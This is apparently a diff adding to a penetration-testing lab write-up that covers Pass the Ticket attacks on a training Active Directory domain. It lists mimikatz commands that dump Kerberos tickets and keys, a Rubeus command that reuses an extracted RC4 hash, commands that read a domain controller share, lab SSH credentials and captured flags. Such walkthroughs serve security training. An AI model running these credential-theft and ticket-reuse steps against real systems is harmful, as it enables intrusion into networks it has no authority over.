@@ -525,3 +525,83 @@ sekurlsa::logonpasswords full
     <figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 <mark style="color:green;">**JuL1()\_N3w\_fl@g**</mark>
+
+### Pass the Ticket (PtT) from Windows
+
+#### Questions
+
+**Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?**
+
+* Reminna login via RDP
+* run C:/tools/mimikatz.exe
+
+```cmd-session
+privilege::debug
+sekurlsa::tickets /export
+```
+
+<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+**Answer: 3**
+
+<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+
+**Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \DC01.inlanefreight.htb\john**
+
+```cmd-session
+privilege::debug
+sekurlsa::ekeys
+```
+
+* john
+  * aes256\_hmac: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
+  * rc4\_hmac\_nt: **c4b0e1b10c7ce2c4723b4e2407ef81a2**
+* `Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt`
+* `dir \DC01.inlanefreight.htb\john`
+* `type \DC01.inlanefreight.htb\john\john.txt`
+
+<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**Learn1ng\_M0r3\_Tr1cks\_with\_J0hn**</mark>
+
+**Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt**
+
+`privilege::debug`
+
+`kerberos::ptt "C:\Users\Administrator.WIN01\Desktop[0;7500d]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`
+
+<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
+
+`exit`
+
+`powershell`
+
+`cd C:/john/`
+
+`dir`
+
+`type john.exe`
+
+<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="color:green;">**P4\$$\_th3\_Tick3T\_PSR**</mark>
+
+### Pass the Ticket (PtT) from Linux
+
+Questions
+
+**Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.**
+
+`ssh david@inlanefreight.htb@10.129.218.18 -p 2222`
+
+PW: Password2
+
+<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
+
+**Which group can connect to LINUX01?**
+
+`realm list`
+
+<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>
